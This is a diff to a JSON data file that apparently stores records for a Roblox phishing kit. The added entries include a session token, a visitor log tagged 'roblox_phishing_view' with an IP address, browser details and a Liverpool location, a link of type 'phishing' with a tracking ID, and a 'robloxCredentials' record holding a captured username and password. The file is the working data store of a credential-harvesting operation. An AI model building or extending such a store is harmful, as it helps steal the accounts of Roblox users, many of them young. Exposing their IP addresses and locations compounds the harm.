@@ -30,6 +30,16 @@
         "id": "19ec3681-8a34-45ec-acc2-ca86fc2ef5f3",
         "createdAt": "2025-09-07T20:43:32.978Z"
       }
+    ],
+    [
+      "8a5eff93-5531-4e1f-962b-35b76da3330b",
+      {
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "sessionToken": "8a5eff93-5531-4e1f-962b-35b76da3330b",
+        "expiresAt": "2025-09-14T21:57:12.818Z",
+        "id": "30725dbb-cb95-47ad-bc56-091138b03431",
+        "createdAt": "2025-09-07T21:57:12.818Z"
+      }
     ]
   ],
   "ipLogs": [
@@ -272,6 +282,26 @@
         "deviceBrand": "Apple",
         "timestamp": "2025-09-07T21:46:59.063Z"
       }
+    ],
+    [
+      "55d4fa86-7ce6-428c-8a1e-797512c25d9f",
+      {
+        "id": "55d4fa86-7ce6-428c-8a1e-797512c25d9f",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "referrer": null,
+        "location": "Liverpool, England, UK",
+        "status": "roblox_phishing_view",
+        "isVpn": "no",
+        "vpnLocation": null,
+        "realLocation": null,
+        "deviceType": "unknown",
+        "browserName": "Chrome",
+        "operatingSystem": "unknown",
+        "deviceBrand": "Apple",
+        "timestamp": "2025-09-07T21:57:46.925Z"
+      }
     ]
   ],
   "settings": [
@@ -390,6 +420,21 @@
         "createdAt": "2025-09-07T21:40:09.943Z",
         "updatedAt": "2025-09-07T21:46:59.072Z"
       }
+    ],
+    [
+      "a5620ced-2cdc-438a-ba0e-8a93166d1a8f",
+      {
+        "id": "a5620ced-2cdc-438a-ba0e-8a93166d1a8f",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "originalUrl": null,
+        "linkType": "phishing",
+        "trackingId": "d57eb486",
+        "title": "sadsadsa",
+        "clickCount": 1,
+        "isActive": true,
+        "createdAt": "2025-09-07T21:57:35.767Z",
+        "updatedAt": "2025-09-07T21:57:46.965Z"
+      }
     ]
   ],
   "robloxCredentials": [
@@ -448,8 +493,22 @@
         "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
         "createdAt": "2025-09-07T21:47:50.490Z"
       }
+    ],
+    [
+      "83fcd445-e960-44a2-bdc8-72c2c27ddc19",
+      {
+        "id": "83fcd445-e960-44a2-bdc8-72c2c27ddc19",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "linkId": "a5620ced-2cdc-438a-ba0e-8a93166d1a8f",
+        "capturedUsername": "wocklras",
+        "capturedPassword": "dsadsadsadsa",
+        "capturedAuthCode": null,
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "createdAt": "2025-09-07T21:57:51.331Z"
+      }
     ]
   ],
-  "timestamp": "2025-09-07T21:54:02.171Z",
+  "timestamp": "2025-09-07T21:59:08.782Z",
   "version": "2.2"
 }
